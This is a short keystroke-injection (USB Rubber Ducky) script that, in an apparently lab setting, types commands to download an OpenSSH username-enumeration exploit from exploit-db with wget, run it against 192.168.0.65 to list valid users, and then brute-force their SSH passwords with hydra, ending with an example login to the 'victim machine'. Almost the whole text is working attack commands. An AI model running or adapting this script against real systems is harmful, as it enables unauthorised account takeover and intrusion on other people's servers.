REM open kali Terminal
REM use nmap to check for OpenSSH 
REM nmap -sV -p22 192.168.0.65
REM Checks for OpenSSH on port 22 using 192.168.0.65

STRING wget https://www.exploit-db.com/downloads/45233.py -O ssh_enum.py
DELAY 250
REM This will run the SSH_enum.py script using a local word list
REM unix_users.txt, process them through the script
REM then write the output into a text file, validusers.txt
STRING python ssh_enum.py --username unix_users.txt --outputFile validusers.txt 192.168.0.65
DELAY 500
REM this statement only lists the 'is valid users' and sends the info
REM to a new file.
STRING grep 'is a valid user' validusers.txt |cut -d' ' -f1 > users.txt
REM using hydra to enumerate the username with a password
STRING hydra -L users.txt -P pass.txt 192.168.0.65 ssh_enum
REM Hydra will list the login name or username and the associated password
REM The user can use a username and password to login to the 
REM vicitm machine
REM Example: ssh aisin@192.168.0.65, hit enter then password: aisin